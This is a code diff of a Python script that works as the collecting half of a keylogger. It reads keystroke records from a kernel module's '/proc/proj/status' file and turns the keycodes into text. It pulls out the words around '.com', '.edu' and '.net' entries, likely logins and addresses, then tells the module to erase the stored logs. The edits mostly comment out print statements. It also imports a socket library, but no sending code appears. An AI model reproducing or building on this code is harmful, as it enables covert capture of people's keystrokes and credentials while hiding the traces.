@@ -1,6 +1,6 @@
 from bs4 import BeautifulSoup
 import socket
-# extracted table from http://www.comptechdoc.org/os/linux/howlinuxworks/linux_hlkeycodes.html
+
 def convertWord(oldWord, hasht):
     neword = ""
     for i in oldWord:
@@ -11,6 +11,7 @@ def convertWord(oldWord, hasht):
     return neword
 
 hashtable = {}
+# extracted table from http://www.comptechdoc.org/os/linux/howlinuxworks/linux_hlkeycodes.html
 soup = BeautifulSoup(open('table.html'),'html.parser')
 all_trs = soup.find_all('tr')
 all_trs = all_trs[1:]
@@ -24,7 +25,7 @@ for tr in all_trs:
         else:
             hashtable[val] = shiftval
 
-print(hashtable)
+# print(hashtable)
 
 
 save = ""
@@ -33,7 +34,7 @@ with open('/proc/proj/status','r') as f:
     for fline in f:
         save += fline
 
-
+#Converts words that should be shifted to get correct value
 left = None
 newstr = ""
 new_words = save.split()
@@ -49,7 +50,7 @@ for word in new_words:
     elif word != "space":
         newstr += " {}".format(word)
     
-print(save)
+#print(save)
 
 # check if .com in word or .edu in word or .net 
 indxs = []
@@ -70,8 +71,9 @@ for i in indxs: ## finds .com and gets 5 words before and 5 after for important 
             strs += "{} ".format(indiv)
         strs += " --MSG\n"
 
-print(strs)
+#print(strs)
 
+# Tells the kernel to erase all previous stored key logs
 with open('/proc/proj/status',"w") as f:
     f.write("w")
 
